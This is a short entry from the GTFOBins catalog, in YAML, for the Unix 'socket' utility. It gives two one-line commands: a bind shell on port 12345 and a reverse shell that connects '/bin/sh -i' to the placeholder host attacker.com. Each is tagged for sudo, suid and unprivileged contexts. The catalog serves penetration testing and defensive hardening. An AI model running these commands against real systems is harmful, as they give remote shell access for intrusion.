<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/socket -->
---
functions:
  bind-shell:
  - code: |-
      socket -svp '/bin/sh -i' 12345
    connector: tcp-client
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  reverse-shell:
  - code: |-
      socket -qvp '/bin/sh -i' attacker.com 12345
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    listener: tcp-server
...
